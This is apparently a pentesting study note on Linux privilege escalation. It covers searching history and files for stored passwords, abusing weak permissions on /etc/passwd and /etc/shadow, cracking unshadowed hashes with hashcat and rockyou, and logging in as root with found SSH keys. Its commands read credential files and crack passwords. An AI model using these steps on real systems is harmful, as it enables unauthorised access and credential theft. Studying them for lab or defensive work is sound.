# Escalate via password anf file permission

## Stored Passwords

- `history` or `cat .bash_history` will show previous command and will sometines leak password
- `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
- Sometimes a simple `ls` or `ls -la` will give interesting files

## Weak File permission

- Do we have access to file that we shouldn't?
- `ls -la /etc/passwd`
  - This used to store password
  - If we can modify the file we can remove the x, we could change the num of the group of our user to become part of root group
- `ls -la /etc/shadow`
- We can copy the content of `/etc/passwd` in a file in our attacking machine
- we can then use `unshadow` `unshadow passwd shadow`  
![image](https://user-images.githubusercontent.com/96747355/167272581-c345c457-a9c3-4cf5-a925-e1e88d66cb36.png)  
- We can then copy this output in another file and just keep the users with the hash
![image](https://user-images.githubusercontent.com/96747355/167272620-3ac73fdf-767f-45b6-96b6-044950186a05.png)  
- We can now look for the hash on [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes) our hashes start with `$6$` so we can ctrl+F this and this will give us the mode number to use.
- `hashcat -m 1800 unshadowed /usr/share/wordlists/rockyou.txt -O`
![image](https://user-images.githubusercontent.com/96747355/167272817-b884a708-a2b6-47e7-b4da-50b909b62536.png)  

## SSH keys

- `find / -name authorized_keys 2> /dev/null`
- `find / -name id_rsa 2> /dev/null`
- If we find an id_rsa key, we can copy it in our machine and use it to log in
- Before using it we have to change the right `chmod 600 id_rsa`
- And then we can just `ssh -i id_rsa root@10.10.240.48`
